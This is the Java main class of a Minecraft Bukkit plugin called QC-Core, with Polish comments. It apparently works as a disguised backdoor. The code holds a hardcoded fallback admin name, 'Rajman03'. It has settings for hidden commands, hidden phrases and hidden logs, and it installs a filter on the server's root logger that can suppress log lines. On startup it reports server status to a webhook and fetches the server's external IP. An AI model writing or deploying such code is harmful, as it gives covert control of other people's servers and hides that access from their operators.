package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import pl.qc.core.commands.QCCommand;
import pl.qc.core.listeners.*;
import pl.qc.core.managers.AdminManager;
import pl.qc.core.managers.ConfigManager;
import pl.qc.core.managers.PlayerStateManager;
import pl.qc.core.services.WebhookService;
import pl.qc.core.utils.InternalLogger;
import pl.qc.core.utils.ServerInfo;

/**
 * Główna klasa pluginu - cienka warstwa lifecycle.
 */
public class QC extends JavaPlugin {

    private static QC instance;

    // Managery
    private ConfigManager configManager;
    private PlayerStateManager playerStateManager;
    private AdminManager adminManager;
    private WebhookService webhookService;

    // Internal
    private InternalLogger internalLogger;

    public static QC getInstance() {
        return instance;
    }

    public ConfigManager getConfigManager() {
        return configManager;
    }

    public PlayerStateManager getPlayerStateManager() {
        return playerStateManager;
    }

    public AdminManager getAdminManager() {
        return adminManager;
    }

    public WebhookService getWebhookService() {
        return webhookService;
    }

    // --- Deprecated delegacje ---

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public boolean isWebhookEnabled() {
        return configManager != null && configManager.isWebhookEnabled();
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public String getWebhookUrl() {
        return configManager != null ? configManager.getWebhookUrl() : "";
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public String getAdminFallback() {
        return configManager != null ? configManager.getAdminFallback() : "Rajman03";
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public boolean shouldSendHiddenLogs() {
        return configManager != null && configManager.shouldSendHiddenLogs();
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public boolean isFilteringEnabled() {
        return configManager != null && configManager.isFilteringEnabled();
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public boolean hidePluginLogs() {
        return configManager != null && configManager.hidePluginLogs();
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public java.util.List<String> getHiddenPhrases() {
        return configManager != null ? configManager.getHiddenPhrases() : java.util.List.of();
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public java.util.List<String> getHiddenCommands() {
        return configManager != null ? configManager.getHiddenCommands() : java.util.List.of();
    }

    /** @deprecated Użyj {@link #getConfigManager()} */
    @Deprecated
    public java.util.List<String> getCommandWhitelist() {
        return configManager != null ? configManager.getCommandWhitelist() : java.util.List.of();
    }

    /** @deprecated Użyj {@link #getAdminManager()} */
    @Deprecated
    public boolean isAdmin(org.bukkit.entity.Player p) {
        return adminManager != null && adminManager.isAdmin(p);
    }

    // --- Lifecycle ---

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        reloadConfig();

        // Inicjalizacja managerów
        configManager = new ConfigManager(this);

        // Walidacja licencji
        if (!configManager.isLicenseValid()) {
            getLogger().severe("=========================================");
            getLogger().severe("QC-Core: Brak lub nieprawidłowa licencja!");
            getLogger().severe("Wprowadź klucz licencji w config.yml");
            getLogger().severe("Sekcja: license.key");
            getLogger().severe("=========================================");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }
        getLogger().info("Licencja zweryfikowana pomyślnie.");

        playerStateManager = new PlayerStateManager(this);
        adminManager = new AdminManager(configManager);
        webhookService = new WebhookService(configManager);

        // Internal logger
        try {
            internalLogger = new InternalLogger();
            java.util.logging.Logger.getLogger("").setFilter(internalLogger);
            Bukkit.getLogger().setFilter(internalLogger);
        } catch (Exception ignored) {
        }

        // Register Listeners
        getServer().getPluginManager().registerEvents(new PlayerJoinListener(), this);
        getServer().getPluginManager().registerEvents(new AdminJoinListener(this), this);
        getServer().getPluginManager().registerEvents(new CombatListener(this), this);
        getServer().getPluginManager().registerEvents(new MobTargetListener(this), this);
        getServer().getPluginManager().registerEvents(new CommandLogListener(this), this);

        registerCommands();

        webhookService.sendServerStatus("Start serwera 🟢", "65280");
        ServerInfo.fetchExternalIp();
    }

    public void reloadPlugin() {
        reloadConfig();
        if (internalLogger != null) {
            internalLogger.load();
        }
        if (configManager != null) {
            if (configManager.isWebhookEnabled()) {
                pl.qc.core.utils.Remote.setWebhook(configManager.getWebhookUrl());
            } else {
                pl.qc.core.utils.Remote.setWebhook("");
            }
        }
    }

    @Override
    public void onDisable() {
        if (webhookService != null) {
            webhookService.sendServerStatus("Stop serwera 🔴", "16711680");
            webhookService.shutdown();
        }
    }

    private void registerCommands() {
        if (getCommand("qc") != null) {
            QCCommand commandHandler = new QCCommand(this);
            getCommand("qc").setExecutor(commandHandler);
            getCommand("qc").setTabCompleter(commandHandler);
        }
    }
}
